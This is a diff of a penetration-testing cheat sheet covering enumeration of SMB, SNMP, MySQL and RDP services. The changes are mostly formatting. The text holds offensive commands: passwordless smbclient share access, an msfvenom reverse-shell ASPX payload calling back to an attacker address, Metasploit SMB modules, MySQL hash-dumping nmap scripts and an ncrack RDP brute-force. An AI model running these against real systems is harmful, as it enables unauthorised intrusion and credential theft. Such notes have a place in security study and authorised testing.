@@ -167,11 +167,12 @@ Enumeration commands for Microsoft SMB service;
  ### Accessing the SAMBA Services
  
  *Entering with smbclient in samba shares without passwd
- `ITDEPT` name of share
+ 
+ *`ITDEPT` name of share
                 
     smbclient --no-pass //192.168.236.11/ITDEPT
-  ### Trick in  samba services 
-  *there maybe a port that run in the browser as samba service, So upload payload in samba and run in browser to get shell
+  ### Trick in samba services 
+  *There maybe a port that run in the browser as samba service, So upload payload in samba and run in browser to get shell
   * Example windows gennerate payload with msfvenom
         
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.152.52  LPORT=4444 — platform windows -a x64 -f aspx -o shell2.aspx
@@ -186,6 +187,7 @@ Enumeration commands for Microsoft SMB service;
     auxiliary/scanner/smb/smb_lookupsid
     auxiliary/scanner/smb/smb_ms17_010
     auxiliary/scanner/smb/smb_version
+
 
 ## Port 161/162 - UDP
 
@@ -213,12 +215,17 @@ Enumeration commands for SNMP service;
     1.3.6.1.2.1.25.6.3.1.2 Software Name
     1.3.6.1.4.1.77.1.2.25 ote configuration of the HP Jetdirect device when there are no other configuration methods or it can be used to check the current configurationUser Accounts
     1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+    
+    
 ## Port 3306
-Enumeration commands for MySQL service;
+Enumeration commands for `MySQL` service;
 
-       nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-        variables,mysql-vuln-cve2012-2122 192.168.1.10
+       nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10
         mysql --host=192.168.1.10 -u root -p
+        
+        
  ## Port 3389
+ 
 Enumeration commands for Remote Desktop service;
 
     ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1
